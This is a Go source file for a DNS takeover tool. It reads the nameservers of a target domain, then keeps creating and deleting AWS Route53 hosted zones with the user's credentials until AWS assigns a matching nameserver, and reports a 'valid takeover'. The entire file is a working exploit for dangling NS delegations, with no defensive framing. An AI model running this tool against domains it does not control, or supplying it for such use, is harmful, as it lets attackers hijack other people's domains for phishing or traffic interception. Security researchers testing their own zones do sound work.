package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/route53"
)

var (
	TargetDomain = flag.String("t", "", "target domain")
	Delay        = flag.Int("delay", 2, "delay between requests")
	Credentials  = flag.String("c", "/root/.aws/credentials", "file containing aws creds.")
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func caller(n int) *string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	s := string(b)
	return &s
}
func main() {
	flag.Parse()
	if *TargetDomain == "" {
		flag.Usage()
		os.Exit(1)
	}
	for {
		var nameservers []string
		var createdNameServers []string
		idRegex := regexp.MustCompile(`(?:.*?\/){2}`)
		nameserver, _ := net.LookupNS(*TargetDomain)
		for _, ns := range nameserver {
			f := len(ns.Host)
			nameservers = append(nameservers, ns.Host[:f-1])
		}
		creds := credentials.NewSharedCredentials(*Credentials, "default")
		conf := aws.Config{Region: aws.String("us-east-1"), Credentials: creds}
		sess := session.New(&conf)
		svc := route53.New(sess)
		req := &route53.CreateHostedZoneInput{
			CallerReference: caller(10),
			Name:            TargetDomain,
		}
		resp, err := svc.CreateHostedZone(req)
		if err != nil {
			log.Fatalf("Error: %v", err)
		}
		createdZoneID := idRegex.ReplaceAllString(*resp.HostedZone.Id, "")
		fmt.Println("[>] Created Hosted Zone ->", createdZoneID)
		for _, ns := range resp.DelegationSet.NameServers {
			createdNameServers = append(createdNameServers, *ns)
		}
		fmt.Println("\t-> Comparing NameServers")
		for _, tg := range nameservers {
			for _, created := range createdNameServers {
				if (strings.Compare(tg, created)) == 0 {
					fmt.Printf("[>] SUCCESS: Valid takeover: %s\n", createdZoneID)
					fmt.Printf("[>] Nameserver: %s", tg)
					os.Exit(0)
				}
			}
		}
		DeleteZone(createdZoneID)
		// avoid getting throttled
		// by AWS's API
		time.Sleep(time.Duration(*Delay) * time.Second)
	}
}
func DeleteZone(id string) {
	creds := credentials.NewSharedCredentials(*Credentials, "default")
	conf := aws.Config{Region: aws.String("us-east-1"), Credentials: creds}
	sess := session.New(&conf)
	svc := route53.New(sess)
	req := &route53.DeleteHostedZoneInput{}
	req.SetId(id)
	_, err := svc.DeleteHostedZone(req)
	if err != nil {
		log.Fatalf("Error: %v", err)
	}
	fmt.Printf("\t-> Deleted Hosted Zone -> %s\n", id)
}
